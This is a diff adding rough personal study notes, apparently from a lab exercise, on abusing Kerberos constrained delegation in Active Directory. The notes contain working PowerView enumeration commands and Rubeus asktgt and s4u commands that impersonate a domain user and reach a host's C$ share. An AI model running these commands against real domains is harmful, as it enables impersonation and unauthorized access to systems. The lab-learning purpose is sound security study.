@@ -1,0 +1,52 @@
+client is the person who requests access
+kdc is authority
+service is the resource client is trying to access
+
+tgt, tgs
+
+spn (unique identifier for service instance)
+
+deligation
+  forntend is allowed to deligate
+  allows the web server to request a TGS for the database service on behalf of the user
+
+min 30
+
+40min left
+
+powershell
+  .\PowerView.ps1 // to have powerview commands
+  Get-DomainComputer -TrustedToAuth // trust to authenticate
+  check what this user can allow for services
+    {HTTP/winterfell}
+    search for adsecurity.org
+      in search: active directory services
+      search: cifs service adsecurity
+        AD resources section
+        SPNs
+          CIFS, fts, host, ldap, mssql // basically you see list of services we can check
+
+  Get-DomainUser -TrustedToAuth
+  Jon Snow is allowed to deligate {CIFS/Winterfell}
+    we need to get tgt for Jon Snow
+
+  .\Rubeus.exe asktgt /user:jon.snow /domain:north.sevenkingdoms.local /rc4:BD... nowrap // /domain:north.sevenkingdoms.local is service
+    it takes ntlm, rc4, aes...
+    I got tgt, now I request tgs on behalf of another user
+    he can request with htis tgt, tgs for any user that has access to this service
+
+    cd \\ winterfell\C$
+      access denied
+    .Rubeus.exe s4u /ticket:[tgt] /impersonateuser:rob.stark /msdsspn:cifs/winterfell /ptt
+      // got ticket
+      http, host, cifs...
+
+      got back tgs ticket for cifs
+      klist
+
+      cd \\winterfell\C$
+
+      klist purge delete everything
+      klist will list the ticket
+
+
